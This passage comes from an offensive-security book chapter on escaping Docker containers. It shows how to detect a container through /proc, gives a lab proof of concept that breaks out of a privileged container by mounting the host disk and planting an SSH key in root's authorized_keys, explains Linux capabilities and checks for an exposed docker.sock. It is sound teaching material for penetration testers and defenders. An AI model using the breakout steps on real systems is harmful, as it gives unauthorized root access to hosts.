
```
10:blkio:/docker/Sea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
9:cpuset:/docker/Sea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
--snip--

shell> cat /proc/1/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/1/6CWK4O7ZJREMTOZGIKSF5XG6HS
```

Listing 6-6: Listing attributes of the process bearing PID 1 in the /proc folder

We could keep going, but it is pretty clear from the mentions of Docker in the cgroup names and mount points that we are trapped inside a container. Plus, in a typical modern Linux system, the command starting the first process should be akin to /sbin/init or /usr/lib/systemd, not /bin/sh.

Being root inside a container still gives us the power to install packages and access root-protected files, mind you, but we can only exert that power over resources belonging to our narrow and very limited namespace.

One of the very first reflexes to have when landing in a container is to check whether it is running in privileged mode.

## Checking for Privileged Mode

In privileged execution mode, Docker merely acts as a packaging environment: it maintains the namespace isolation but grants wide access to all device files, like the hard drive, as well as all the Linux capabilities (more on that in the next section).

The container can therefore alter any resource on the host system, such as the kernel features, hard drive, network, and so on. If we find we’re in privileged mode, we can just mount the main partition, slip an SSH key in any home folder, and open a new admin shell on the host. Here’s a quick proof of concept of just that in the lab for illustration purposes:

```
# Demo lab
root@DemoContainer:# ls /dev
autofs      kmsg        ppp         tty10
bsg         lightnvm    psaux       tty11
--snip--
# tty devices are usually filtered out by cgroups, so we must be inside a privileged container

root@DemoContainer:# fdisk -l
Disk /dev/dm-0: 23.3 GiB, 25004189184 bytes, 48914432 sectors
Units: sectors of 1 * 512 = 512 bytes
--snip--

# mount the host's main partition
root@DemoContainer:# mount /dev/dm-0 /mnt && ls /mnt
bin  dev  home  lib  lost+found  mnt  proc...

# inject our SSH key into the root home folder
root@DemoContainer:# echo "ssh-rsa AAAAB3NzaC1yc2EA..." > /mnt/root/.ssh/authorized_keys
```

```
# get the host's IP and SSH into it
root@DemoContainer:/# ssh root@172.17.0.1

root@host:/#
```

> NOTE
An unprivileged user even inside a privileged container could not easily break out using this technique since the mount command would not work. They would need to first elevate their privileges or attack other containers on the same host that are exposing ports, for instance.

You would think that nobody would dare run a container in privileged mode, especially in a production environment, but life is full of surprises, and some folks may require it. Take a developer who needs to adjust something as simple as the TCP timeout value (a kernel option). To do this, the developer would naturally browse the Docker documentation and come across the sysctl Docker flag, which essentially runs the sysctl command from within the container. However, when run, this command will, of course, fail to change the kernel TCP timeout option unless it's invoked in privileged mode. The fact that putting the container in privileged mode is a security risk would not even cross this developer's mind—sysctl is an official and supported flag described in the Docker documentation, for heaven's sake!

## Linux Capabilities

Now we can return to our survey app to check whether we can easily break namespace isolation. We list the /dev folder's contents, but the result lacks all the classic pseudo-device files like tty*, sda, and mem that imply privileged mode. Some admins trade the privileged mode for a list of individual permissions or capabilities. Think of capabilities as a fine-grained breakdown of the permissions classically attributed to the all-powerful root user on Linux. A user with the capability CAP_NET_ADMIN would be allowed to perform root operations on the network stack, such as changing the IP address, binding to lower ports, and entering promiscuous mode to sniff traffic. The user would, however, be prevented from mounting filesystems, for instance. That action requires the CAP_SYS_ADMIN capability.

> NOTE
One can argue that the capability CAP_SYS_ADMIN is the new root, given the number of privileges it grants.

When instructed to do so by the container's owner with the --add-cap flag, Docker can attach additional capabilities to a container. Some of these powerful capabilities can be leveraged to break namespace isolation and reach other containers or even compromise the host by sniffing packets routed to other containers, loading kernel modules that execute code on the host, or mounting other containers' filesystems.

We list the current capabilities of the surveysapp container by inspecting the /proc filesystem and then decode them into meaningful permissions using the capsh tool:

```
shell> cat /proc/self/status |grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

```
root@Bouncer:/# capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,...
```

The effective and permitted capabilities of our current user are CapPrm and CapEff, which amount to the normal set of permissions we can expect from root inside a container: kill processes (CAP_KILL), change file owners (CAP_CHOWN), and so on. All these operations are tightly confined to the current namespace, so we are still pretty much stuck.

### COMPLEXITIES OF CAPABILITIES

Capabilities can quickly become ugly, especially in the way they are handled during runtime. When a child thread is spawned, the kernel assigns it multiple lists of capabilities, the most important two being the set of effective (CapEff) and permitted (CapPrm) capabilities. CapEff reflects the native permissions that can be exerted right away, while a capability in CapPrm can only be used after a capset system call that specifically acquires that privilege (capset sets the corresponding bit in CapEff).

CapPrm is the sum of three inputs:
- Common capabilities found in both the inheritable capabilities (CapInh) of the parent process and the inheritable capabilities of the corresponding file on disk. This operation is performed through a bitwise AND, so a file with no capabilities, for example, nullifies this input.
- Permitted capabilities (CapPrm) of the executable file, as long as they fall within the maximum set of capabilities allowed by the parent process (CapBnd).
- The parent process’s ambient capabilities (CapAmb). The parent cherry-picks appropriate capabilities from its CapPrm and CapInh and adds them to the CapAmb list to be transferred to the child process. CapAmb is only there as a trick to allow “regular” scripts without any file capabilities to inherit some of the caller’s capabilities. In other words, even if the first input of this list is nullified, the parent can still infuse its children with its inheritable or permitted capabilities. If the executable file has capabilities, this third input is ignored.

The child's CapEff list is equal to its CapPrm if the file has the effective bit set; otherwise, it gets populated by CapAmb. Inheritable capabilities (CapInh) and bounded capabilities (CapBnd) are transferred as is to the child process.

Before you start loading your shotgun, know that I only wrote this to demonstrate how tricky it is to determine the set of capabilities assigned to a new process. I encourage you to dive deeper into the subject and learn how to leverage capabilities in containers. You can start with Adrian Mouat's excellent introduction “Linux Capabilities: Why They Exist and How They Work” at https://blog.container-solutions.com/ and the official Linux kernel manual page on capabilities in Section 7 of https://man7.org/.

## Docker Socket

Next we look for the /var/run/docker.sock file, which is the REST API used to communicate with the Docker daemon on the host. If we can reach this socket from within the container, using a simple curl for instance, we can instruct it to launch a privileged container and then gain root access to the host system. We begin by checking for docker.sock:

```bash
shell> curl --unix-socket /var/run/docker.sock http://localhost/images/json
curl: (7) Couldn't connect to server

shell> ls /var/run/docker.sock
ls: cannot access '/var/run/docker.sock': No such file or directory
shell> mount | grep docker

# docker.sock not found
```

No luck there. We then check the kernel's version, hoping for one that has some documented exploits to land on the host, but we strike out once more. The machine is running a 4.14.146 kernel, which at the time I ran this was only a couple of versions behind the latest version:

```bash
shell> uname -a
Linux f1a7a6f60915 4.14.146-119.123.amzn2.x86_64 #1
```

All in all, we are running as a relatively powerless root user inside an up-to-date machine without any obvious misconfigurations or exploits. We can always set up a similar kernel in a lab and then drill down into memory structures and syscalls until we find a zero-day to break namespace isolation, but let's leave that as a last resort kind of thing.

The first impulse of any sane person trapped in a cage is to try to break free. It's a noble sentiment. But if we can achieve our most devious goals while locked behind bars, why spend time sawing through them in the first place?

It sure would be great to land on the host and potentially inspect other containers, but given the current environment, I believe it's time we pull back from the barred window, drop the useless blunt shank, and focus instead on the bigger picture.
